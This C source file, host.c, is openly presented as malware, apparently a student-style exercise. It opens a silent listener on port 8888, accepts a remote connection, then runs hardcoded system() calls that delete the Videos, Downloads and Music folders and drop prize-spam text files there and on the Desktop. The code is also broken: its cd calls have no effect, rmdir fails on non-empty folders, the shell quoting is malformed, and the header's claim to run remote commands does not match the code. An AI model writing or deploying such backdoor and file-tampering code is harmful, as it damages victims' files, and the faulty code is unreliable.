/* host.c */

#include<stdlib.h>
#include<stdio.h>
#include<unistd.h>
#include<string.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<arpa/inet.h>

// Malware program that runs commands issued from remote user

int main(int argc, char *argv[]) {

// Step 1: Listen to port, wait for remote connection

  int hostSock, remoteSock, wasRead;
  struct sockaddr_in host, remote;
  short port = 8888;
  int adrLength = sizeof(struct sockaddr_in);
  
  //Step 1A: Set up Port (socket)
  
  hostSock = socket(AF_INET, SOCK_STREAM, 0);
  //Error out if invalid
  if (hostSock == -1) {
    // No error message because it's malicious!
    exit(0);
  }

  host.sin_family = AF_INET;
  host.sin_addr.s_addr = INADDR_ANY;
  host.sin_port = htons(port);
  
  //Binding. If unsuccessful, error out
  if (bind(hostSock, (struct sockaddr *) &host, sizeof(host)) < 0) {
    //Again, opting for no error message for maliciousness.
    close(hostSock);
    exit(0);
  }

  //Step 1B: Wait for remote connection to local Port from remote user, proceed to Step 2

  listen(hostSock, SOMAXCONN);
  //Accept connection
  remoteSock = accept(hostSock, (struct sockaddr *) &remote, (socklen_t *) &adrLength);
  if (remoteSock < 0) {
    exit(0);
  }
 

// Step 2: Execute commands
  char command[200]; //String to hold command e.g. "echo hello world"
  memset(command, 0, sizeof(command));

  //Step 2A: Get content of string from specified Port from Step 1.
  if ((wasRead = read(remoteSock, command, sizeof(command))) > 0) {
    printf("Success\n");
    printf("%s\n", command);
  }

  //Step 2B: Set up for system call

  // Step 2C: System call

  //Changes current directory to computer
  strcpy(command,"cd");
  system(command);
  
  //Remove Videos, Downloads, and Music directories and all contents in them
  strcpy(command,"cd");
  system(command);
  strcpy(command,"rmdir Videos");
  system(command);
  strcpy(command,"rmdir Downloads");
  system(command);
  strcpy(command,"rmdir Music");
  system(command);

  //Recreate the deleted directories to place our own files into them
  strcpy(command,"mkdir Videos");
  system(command);
  strcpy(command,"mkdir Downloads");
  system(command);
  strcpy(command,"mkdir Music");
  system(command);

  //Place spam Files into the directories
  strcpy(command,"cd Videos");
  system(command);
  strcpy(command,"echo 'You've just won 1 million dollars!' > congrats.txt");
  system(command);
  strcpy(command,"echo 'Click Here to claim your prize!' > winner.txt");
  system(command);


  //Return to computer then put things into music directory
  strcpy(command,"cd");
  system(command);
  strcpy(command,"cd Music");
  system(command);
  strcpy(command,"echo 'You've just won 1 million dollars!' > congrats.txt");
  system(command);
  strcpy(command,"echo 'Click Here to claim your prize!' > winner.txt)");
  system(command);

  //Return to computer then put things into Downloads directory
  strcpy(command,"cd");
  system(command);
  strcpy(command,"cd Downloads");
  system(command);
  strcpy(command,"echo 'You've just won 1 million dollars!' > congrats.txt");
  system(command);
  strcpy(command,"echo 'Click Here to claim your prize!' > winner.txt");
  system(command);

  //Place a couple of junk files on their desktop too
  strcpy(command,"cd");
  system(command);
  strcpy(command,"cd Desktop");
  system(command);
  strcpy(command,"echo 'You've just won 1 million dollars!' > congrats.txt");
  system(command);
  strcpy(command,"echo 'Click Here to claim your prize!' > winner.txt");
  system(command);
// Step 3: Return results to remote user?
  //Maybe use system(ls -l) and return the information of files from their desktop?  just an option

// Step 4: Teardown
  close(remoteSock);
  close(hostSock);
  return 0;
}
